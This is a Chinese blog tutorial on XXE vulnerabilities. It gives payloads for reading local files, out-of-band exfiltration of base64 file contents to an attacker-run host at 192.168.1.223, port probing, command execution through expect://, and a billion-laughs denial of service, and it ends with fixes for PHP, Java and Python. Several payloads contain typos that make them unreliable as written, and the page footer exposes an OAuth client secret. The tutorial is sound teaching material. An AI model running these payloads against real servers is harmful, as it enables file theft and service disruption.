title="CDATA"></a>CDATA</h2><p>CDATA值得是不应由XML解析器进行解析的文本数据。<br>CDATA部分中的所有内容都会被解析器葫芦哦。<br>某些文本,比如JavaScript代码,包含大量的”&lt;”或”&amp;”字符.为了避免错误,可以将脚本代码定义为CDATA.<br>CDATA部分不能包含字符串”]]&gt;”.也不允许嵌套的CDATA部分,这样会导致异常的闭合,从而使解析器报错.<br>标记CDATA部分结尾的”]]&gt;”不能包含空格或换行<br>CDATA部分由<code>&lt;![CDATA[&quot;开始,由&quot;]]&gt;</code>结束:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>   </span><br><span class="line">  &lt;![CDATA[       </span><br><span class="line"><span class="actionscript">  	<span class="comment">/*  Code   */</span>   </span></span><br><span class="line">  ]]&gt; </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>解析器会忽略CDATA部分中的所有内容.</p><h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><p>实体适用于定义引用普通文本或特殊字符的快捷方式的变量.(实体其实可以看成一个变量,到时候我们可以在XML中通过&amp;符号进行引用)<br>内部普通实体:<br>声明:<code>&lt;!RNTITY 实体名称 &quot;实体的值&quot;&gt;</code><br>引用:一个实体的引用,由三部分构成:&amp;符号,实体名称,分号.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="IOS-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">author</span> [    </span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ELEMENT <span class="meta-keyword">author</span> <span class="meta-keyword">ANY</span>&gt;</span>   </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">writer</span> <span class="meta-string">"Bill Gates"</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ELEMENT <span class="meta-keyword">copyright</span> <span class="meta-string">"Copyright Mature"</span>&gt;</span></span></span><br><span class="line"><span class="meta"> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span>$copyright;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure><p>外部普通实体:<br>声明:<code>&lt;!RNTITY 实体名称 SYSTEM &quot;URL/URL&quot;&gt;</code><br><code>&lt;!RNTITY 实体名称 PUBLIC &quot;DTD标识名&quot; &quot;公用的DTD的URL&quot;&gt;</code></p><table><thead><tr><th>libxml2</th><th>php</th><th>java</th><th>.NET</th></tr></thead><tbody><tr><td>file<br>http<br>ftp</td><td>file<br>http<br>ftp<br>php<br>compress. zlib<br>compress .bzip2<br>data<br>glob<br>phar</td><td>http<br>https<br>ftp<br>file<br>jar<br>netdoc<br>mailto<br>gopher *</td><td>file<br>http<br>https<br>ftp</td></tr></tbody></table><p>现在浏览器不再支持对外部实体直接解析,所以这里借助php来解析,当然也能用其他语言.<br>例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!RNTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///c:/flag.txt"</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体:"></a>参数实体:</h2><p>声明:<br>内部:<code>&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</code><br>外部:<code>&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code><br>注意:<br>(1)使用% 实体名(这里面空格不能少)在DTD中定义，并且只能在DTD中使用“%实体名;”引用<br>(2)只有在DTD文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用<br>简单理解呢，就是参数实体不能像普通实体那样在xm|文档内容中进行引用，它的引用范围只在当前xml文件的DTD声明中，或者是当前的DTD文件中。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">name</span> <span class="meta-keyword">SYSTEM</span> “file:///etc/passwd”&gt;</span></span></span><br><span class="line"><span class="meta"> %name; </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><h1 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景:"></a>利用场景:</h1><p>一般XXE利用分为两大场景:有回显和无回显。</p><p>有回显的情况可以直接在页面中看到Payload的执行结果或现象, (带内XML外部实体(XXE),&lt;即攻击者可以发送带有XXE有效负载的请求并从包含某些数据的Web应用程序获取响应)</p><p>无回显的情况又称为Blind XXE,可以使用外带数据通道提取数据即带外XML外部实体(00B-XXE)。</p><h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现:"></a>漏洞发现:</h1><p>a.首先寻找接受XML作为输入内容的端点。<br>(可以通过修改HTTP的请求方法，修改Content-Type头部字段等等方法，然后看看应用程序的响应,看看程序是否解析了发送的内容，如果解析了，那么则可能有XXE攻击漏洞。)<br>还可以尝试注入xml预定义的一些实体，看其是否报错.通过报错信息判断<br>b.如果站点解析xml,就可以尝试引用实体和DTD<br>c.如果可以引用外部实体，则存在xxe漏洞.</p><h1 id="XXE漏洞利用"><a href="#XXE漏洞利用" class="headerlink" title="XXE漏洞利用"></a>XXE漏洞利用</h1><h2 id="1-有回显的本地文件读取"><a href="#1-有回显的本地文件读取" class="headerlink" title="1.有回显的本地文件读取"></a>1.有回显的本地文件读取</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//读取文件的payload </span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xm1 version=<span class="string">"1.0"</span> encoding= <span class="string">"utf-8"</span> <span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="tag">&lt; <span class="attr">DOCTYPE</span> <span class="attr">user</span>[ </span></span><br><span class="line">         &lt;!ENTITY all SYSTEM "file:///C:/windows/system.ini"&gt;</span><br><span class="line">]&gt; </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span> 132123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-当所读取文件包含了-lt-或者-amp"><a href="#2-当所读取文件包含了-lt-或者-amp" class="headerlink" title="2.当所读取文件包含了&lt;或者&amp;"></a>2.当所读取文件包含了&lt;或者&amp;</h2><p>当我们读取的文件中包含了一些特殊符号(如&lt; &amp;)的时候,会发现爆了一堆错而且读取不到该文件的内容<br>既然是xml会把&lt;等热数字福解析导致的错误,那我们就可以使用之前讲的CDATA来绕过下:<br>我们尝试在xml中对其进行一个拼接:<br>尝试的payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.8" encoding-"utf-8"?&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">user</span> [ </span></span><br><span class="line">          &lt;IENTITY start "(![CDATA[") </span><br><span class="line"><span class="tag">&lt;<span class="name">KIENTITY</span> <span class="attr">xxe</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">C:</span>/<span class="attr">test.txt</span>"  </span></span><br><span class="line">          &lt;IENTITY end "]]&gt;"&gt; </span><br><span class="line">]&gt; </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>$start;$xxe;$end;<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>132123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用参数实体在内部DTD进行拼接:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">root</span>[</span></span><br><span class="line">&lt;IENTITY % xxe "&lt;[CDATA["&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">IENTITY</span> % <span class="attr">xxe2</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>//<span class="attr">c:</span>/<span class="attr">123.txt</span>"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe3</span> <span class="meta-string">"]]&gt;"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENMITY <span class="meta-keyword">all</span> %xxe;%xxe2;%xe3;&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">roo1</span>&gt;</span><span class="symbol">&amp;all;</span> <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>还报错的原因:<br>根据XML规范所描述:<br>“在DTD内部子集中的参数实体调用，不能混掺到标记语中”<br>也就是说参数实休不能在内部DTD中进行拼接，但是XML规范还声明了一点:“外部参数实体不受此限制”，这就告诉我们可以使用外部的DTD来构造payload,将我们的CDATA内容拼按起来</p><p>既然外部参数实体不受此限制,那:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml vers1on="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">user</span> [</span></span><br><span class="line">&lt;!ENTITY % start "&lt;![CDATA["&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">IENTITY</span> % <span class="attr">xxe</span> <span class="attr">SYSTEM</span> <span class="attr">file:</span>///<span class="attr">C:</span>/<span class="attr">test.</span> <span class="attr">txt</span>"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">"]]&gt;"</span>&gt;</span></span><br><span class="line">C!ENTITY % dtd SYSTEM "http://192.168.1.223/xxe.dtd"&gt;</span><br><span class="line"><span class="symbol">&amp;dtd;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>132123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>xxe.dtd文件中的内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">all</span> <span class="meta-string">"%start;%xxe;%end;"</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3-使用PHP伪协议进行读取文件"><a href="#3-使用PHP伪协议进行读取文件" class="headerlink" title="3.使用PHP伪协议进行读取文件"></a>3.使用PHP伪协议进行读取文件</h2><p>用到的伪协议:php://filter<br>实际利用:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYEPE <span class="meta-keyword">user</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">all</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=D://123.txt"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>12346<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-无回显的文件读取-OOB-out-of-band外带参数实体注入"><a href="#4-无回显的文件读取-OOB-out-of-band外带参数实体注入" class="headerlink" title="4.无回显的文件读取(OOB out-of-band外带参数实体注入)"></a>4.无回显的文件读取(OOB out-of-band外带参数实体注入)</h2><p>在实际情况中，大多数情况下服务器上的XML 并不是输出用的，所以就少了输出这一环节，这样的话，即使漏洞存在，我们的payload的也被解析了，但是由于没有输出，我们也不知道解析得到的内容是什么，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法一 外带数据<br>利用思路:<br>通过外部DTD的方式可以将内部参数实体的内容与外部DTD声明的实体的内容拼接起来.<br>利用payload来从目标主机读取到文件内容后，将文件内容作为ur1的一部分来请求我们本地监听的端口<br>实际利用:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version-1.0" encoding-"utf-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://192. 168.1.223/b.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote ;%int ;%send;]&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//b.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=D://123.txt"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY #37; send SYSETEM 'http://192.168.1.223:9999/?p=%file;'&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="5-利用XXE进行端口探测"><a href="#5-利用XXE进行端口探测" class="headerlink" title="5.利用XXE进行端口探测:"></a>5.利用XXE进行端口探测:</h2><p>因为我们的XML在外部DTD和外部实体的时候支持HTTP协议,我们可以利用这个特点:<br>实际利用:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xml</span> <span class="attr">version-</span>"<span class="attr">1.0</span>" <span class="attr">encoding</span> "<span class="attr">utf-8</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt; <span class="attr">DOCTYPE</span> <span class="attr">user</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">192</span> <span class="attr">.168.1.223:999</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>8a11;<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>132123<span class="tag">&lt;/<span class="name">password</span>&gt;</span>c<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>未开放的端口响应时间比较长,配合burpsuit的intruder模块进行爆破,</p><h2 id="6-利用php的扩展执行系统命令"><a href="#6-利用php的扩展执行系统命令" class="headerlink" title="6.利用php的扩展执行系统命令"></a>6.利用php的扩展执行系统命令</h2><p>当目标机器安装并加载了PHP的expect扩展,可以执行系统命令.(由于这个扩展不是默认安装的,所以很少碰到!)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [ <span class="meta">&lt;!ELEMENT  <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"expect://id"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="7-利用XXE进行DOS攻击"><a href="#7-利用XXE进行DOS攻击" class="headerlink" title="7.利用XXE进行DOS攻击"></a>7.利用XXE进行DOS攻击</h2><p>在实验的过程中发现,单独一个数据包并不明显,可以结合burpsuite的爆破模块使用!(实际测试切记不要尝试)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line">     <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">lolz</span> [</span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol</span> <span class="meta-string">"lol"</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol2</span> <span class="meta-string">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol3</span> <span class="meta-string">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol4</span> <span class="meta-string">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol5</span> <span class="meta-string">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol6</span> <span class="meta-string">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol7</span> <span class="meta-string">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol8</span> <span class="meta-string">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol9</span> <span class="meta-string">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">     ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="8-java中导入execel处存在的XXE"><a href="#8-java中导入execel处存在的XXE" class="headerlink" title="8.java中导入execel处存在的XXE"></a>8.java中导入execel处存在的XXE</h2><p>Java中比较经典的一个利用点:<br>一般在上传xlsx的地方有可能会存在xxe漏洞,我们就这种情况带大家看下如何利用:<br>(1)新建一个xlsx文件:<br><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/8431122/1609669206901-cebbf9b9-07ba-4cfd-b496-d0a24c811a13.jpeg" alt="3c52f9f636w.jpeg"><br>(2) 使用压缩软件打开刚刚创建的xlsx文件:<br><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/8431122/1609669220464-177174ae-6c55-4beb-b055-6385289deae2.jpeg" alt="17c19d07c2t.jpeg"><br>(3) 复制里面的[Content_Types].xml文件出来,将其打开并添加如我们的xxe漏洞利用payload:<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8431122/1609669230257-2e86c24e-2d68-4af1-80de-d8683d37a47c.png" alt="2c9a13ca728y.png"><br>(4)将插入payload的[Content_Types].xml文件复制到xlsx文件中(直接将其拖入到压缩包打开的xlsx即可)<br><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/8431122/1609669237424-4845c5b8-5a94-4ad5-9aae-6aaaa1c5c2b7.jpeg" alt="8045f71a1bG.jpeg"><br>可以打开复制进去后的[Content_Types].xml文件验证下是否插入了我们的payload.<br>(5) 然后将我们修改后的xlsx文件进行上传,若服务器成功解析后,我们的机器则会接收到服务器的请求:<br><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/8431122/1609669246209-c192f113-b8db-4952-b4bd-75f4cb318681.jpeg" alt="469ab0362db.jpeg"><br>可以看到在导出成功后,我们的机器成功接收到存在xxe漏洞服务器的请求!</p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复:"></a>漏洞修复:</h1><p>方案一:过滤用户输入的xml数据，比如尖括号，一些关键字：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC等<br>方案二:禁止外部实体引用<br>PHP:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><p>JAVA:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactorydbf =DocumentBuilderFactory.newInstance(); </span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line">.setFeature( <span class="string">"http://apache.org/xml/features/disallow-doctype-dec1"</span>,<span class="keyword">true</span>); </span><br><span class="line">.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>,<span class="keyword">false</span>); </span><br><span class="line">.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>,<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>python:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> </span><br><span class="line">etree xmlData= etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure></div><div class="article-footer"><blockquote class="mt-2x"><ul class="post-copyright list-unstyled"><li class="post-copyright-link hidden-xs"><strong>本文链接：</strong> <a href="https://bri10.com/2021/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" title="XXE漏洞概述与利用方式和修复方法" target="_blank" rel="external">https://bri10.com/2021/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！</li></ul></blockquote><div class="panel panel-default panel-badger"><div class="panel-body"><figure class="media"><div class="media-left"><a href="" target="_blank" class="img-burn thumb-sm visible-lg"><img src="/images/Brilo.jpg" class="img-rounded w-full" alt=""></a></div><div class="media-body"><h3 class="media-heading"><a href="" target="_blank"><span class="text-dark">Bri10</span><small class="ml-1x">花开万物</small></a></h3><div>一个网络安全小菜鸡。</div></div></figure></div></div></div></article><section id="comments"></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="next"><a href="/2021/SSRF%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" title="SSRF漏洞概述与利用方式和修复方法"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button"><span>[&nbsp;</span><span>文章目录</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone,wechat"></div></div></div></nav></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/Brilopro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li><li><a href="http://weibo.cn/Bri10" target="_blank" title="Weibo" data-toggle="tooltip" data-placement="top"><i class="icon icon-weibo"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li></ul><div class="copyright">&copy; 2021 Bri10<div class="publishby">Theme by <a href="https://github.com/cofess" target="_blank">cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.</div></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>!function(T){var N={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"分类",TAGS:"标签",UNTITLED:"(未命名)"},ROOT_URL:"/",CONTENT_URL:"/content.json"};T.INSIGHT_CONFIG=N}(window)</script><script src="/js/insight.js"></script><script src="//cdn.jsdelivr.net/npm/gitalk@1.4.0/dist/gitalk.min.js"></script><script src="//cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><script type="text/javascript">var gitalk=new Gitalk({clientID:"310560718cd34bb26177",clientSecret:"0e25c99c861468462f1e08035fd537e0629afd7c",repo:"comment",owner:"Brilopro",admin:["Brilopro"],id:md5(location.pathname),distractionFreeMode:!0});gitalk.render("comments")</script><script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script><script>$(document).ready(function(){$("article img").not("[hidden]").not(".panel-body img").each(function(){var a=$(this),t=a.attr("alt"),n=a.parent("a");if(n.length<1){var e=this.getAttribute("src"),r=e.lastIndexOf("?");-1!=r&&(e=e.substring(0,r)),n=a.wrap('<a href="'+e+'"></a>').parent("a")}n.attr("data-fancybox","images"),t&&n.attr("data-caption",t)}),$().fancybox({selector:'[data-fancybox="images"]',hash:!1,loop:!1})})</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,debug:!1,model:{jsonPath:"live2d-widget-model-hibiki"},display:{position:"right",width:145,height:315},mobile:{show:!0,scale:.5},react:{opacityDefault:.7,opacityOnHover:.8},log:!1})</script></body></html><!-- rebuild by neat -->